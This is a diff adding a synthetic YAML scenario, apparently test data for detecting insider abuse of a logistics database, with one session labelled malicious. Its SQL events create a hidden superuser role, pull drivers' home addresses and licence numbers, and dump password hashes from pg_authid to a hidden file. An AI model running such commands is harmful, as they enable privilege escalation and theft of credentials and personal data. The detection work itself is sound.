@@ -1,0 +1,21 @@
+scenario_id: logistics_priv_abuse_0017
+family_id: logistics_priv_abuse_0017
+domain: logistics
+time_of_day: '23:15'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate_and_dump
+  role: dispatcher
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.7226574681149105
+  events:
+  - step_id: escalate
+    sql: CREATE ROLE admin_backup SUPERUSER LOGIN PASSWORD 'qjh7IgHIq6'
+  - sql: SELECT license_number, home_address, phone, full_name FROM drivers WHERE depot_id != 'DEPOT-CENTRAL'
+  - step_id: dump
+    sql: COPY (SELECT rolname, rolpassword FROM pg_authid) TO PROGRAM 'cat >> /var/lib/postgresql/.cache/creds_dump.txt'
